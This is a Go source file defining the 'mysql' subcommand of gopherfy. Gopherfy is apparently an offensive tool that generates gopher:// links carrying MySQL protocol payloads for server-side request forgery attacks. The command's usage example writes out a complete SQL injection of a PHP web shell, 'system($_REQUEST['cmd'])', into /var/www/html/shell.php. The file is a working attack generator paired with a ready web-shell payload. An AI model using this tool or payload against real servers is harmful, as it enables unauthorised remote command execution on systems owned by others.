//nolint:dupl //ok
package cmd

import (
	"fmt"

	"github.com/hupe1980/gopherfy/pkg/mysql"
	"github.com/spf13/cobra"
)

type mySQLOptions struct {
	addr  string
	user  string
	db    string
	query string
}

func newMySQLCmd(encoder *string) *cobra.Command {
	opts := &mySQLOptions{}

	cmd := &cobra.Command{
		Use:           "mysql",
		Short:         "Generate mysql gopher link",
		Example:       `gopherfy mysql -q "SELECT '<?php system(\$$_REQUEST[\'cmd\']); ?>' INTO OUTFILE '/var/www/html/shell.php'"`,
		SilenceUsage:  true,
		SilenceErrors: true,
		RunE: func(cmd *cobra.Command, args []string) error {
			mysql := mysql.NewMySQL(func(o *mysql.Options) {
				o.Addr = opts.addr
				o.User = opts.user
				o.DB = opts.db
				o.Query = opts.query
			})

			payload := encodePayload(*encoder, mysql.Payload())

			fmt.Println(payload)

			return nil
		},
	}

	cmd.Flags().StringVarP(&opts.addr, "addr", "a", mysql.DefaultAddr, "mysql address")
	cmd.Flags().StringVarP(&opts.user, "user", "u", mysql.DefaultUser, "mysql username")
	cmd.Flags().StringVarP(&opts.db, "db", "d", "", "mysql database name")
	cmd.Flags().StringVarP(&opts.query, "query", "q", "", "mysql query")

	return cmd
}
